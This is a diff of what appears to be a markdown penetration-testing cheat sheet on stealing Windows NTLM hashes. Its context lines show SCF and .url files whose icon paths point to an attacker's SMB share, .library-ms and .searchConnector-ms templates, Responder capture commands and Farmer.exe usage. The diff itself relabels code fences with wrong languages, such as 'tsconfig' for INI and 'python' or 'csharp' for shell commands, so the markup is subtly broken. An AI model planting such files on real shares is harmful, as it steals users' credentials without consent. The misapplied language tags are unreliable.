@@ -10,7 +10,7 @@ It is not new that SCF (Shell Command Files) files can be used to perform a limi
 
 Drop the following `@something.scf` file inside a share and start listening with Responder : `responder -wrf --lm -v -I eth0`
 
-```
+```tsconfig
 [Shell]
 Command=2
 IconFile=\\X.X.X.X\share\pentestlab.ico
@@ -24,7 +24,7 @@ Saving the file as SCF file will make the file to be executed when the user will
 
 This attack also works with `.url` files and `responder -I eth0 -v`.
 
-```
+```tsconfig
 [InternetShortcut]
 URL=whatever
 WorkingDirectory=whatever
@@ -36,7 +36,7 @@ IconIndex=1
 
 Windows Library Files (.library-ms)
 
-```
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <libraryDescription xmlns="<http://schemas.microsoft.com/windows/2009/library>">
   <name>@windows.storage.dll,-34582</name>
@@ -62,7 +62,7 @@ Windows Library Files (.library-ms)
 
 Windows Search Connectors (.searchConnector-ms)
 
-```
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <searchConnectorDescription xmlns="<http://schemas.microsoft.com/windows/2009/searchConnector>">
     <iconReference>imageres.dll,-1002</iconReference>
@@ -81,7 +81,7 @@ Windows Search Connectors (.searchConnector-ms)
 
 Responder needs to be executed with the following parameters to capture the hashes of the users that will browse the share.
 
-```
+```python
 responder -wrf --lm -v -I vboxnet0
 ```
 
@@ -137,7 +137,7 @@ A Meterpreter session will received. However in order to avoid losing the connec
 
 Theses attacks can be automated with [Farmer.exe](https://github.com/mdsecactivebreach/Farmer) and [Crop.exe](https://github.com/mdsecactivebreach/Farmer/tree/main/crop)
 
-```
+```csharp
 # Farmer to receive auth
 farmer.exe <port> [seconds] [output]
 farmer.exe 8888 0 c:\windows\temp\test.tmp # undefinitely
